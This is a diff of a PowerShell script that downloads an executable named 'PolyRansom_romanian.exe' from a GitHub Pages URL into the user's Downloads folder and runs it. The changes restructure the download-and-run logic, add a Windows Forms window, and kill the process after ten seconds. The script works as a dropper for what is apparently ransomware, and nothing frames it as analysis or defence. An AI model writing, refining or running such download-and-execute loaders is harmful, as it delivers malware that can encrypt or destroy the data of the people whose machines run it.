@@ -1,18 +1,7 @@
 $url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/PolyRansom_romanian.exe"
 $downloadPath = Join-Path $env:USERPROFILE "Downloads\PolyRansom_romanian.exe"
-
-function DownloadAndExecute {
-    $webClient = New-Object System.Net.WebClient
-    try {
-        $webClient.DownloadFile($url, $downloadPath)
-    }
-    finally {
-        $webClient.Dispose()
-    }
-    if (Test-Path $downloadPath) {
-        Start-Process -FilePath $downloadPath -Wait
-    }
-}
+$webClient = New-Object System.Net.WebClient
+$webClient.DownloadFile($url, $downloadPath)
 
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
@@ -41,19 +30,13 @@ $form.Add_MouseDown({
 })
 $form.Show()
 
-function CloseApplication {
-    Stop-Process -Name "ActualProcessName" -Force
-}
+Start-Sleep -Seconds 1
 
-function OpenApplication {
+if (Test-Path $downloadPath) {
     Start-Process -FilePath $downloadPath -Wait
-}
+    Start-Sleep -Seconds 10
+    Stop-Process -Name "PolyRansom_romanian.exe" -Force
+    exit
+} else {
 
-DownloadAndExecute
-
-try {
-    Wait-Event -Timeout ([System.Threading.Timeout]::Infinite)
-}
-finally {
-    Get-EventSubscriber | Unregister-Event
 }
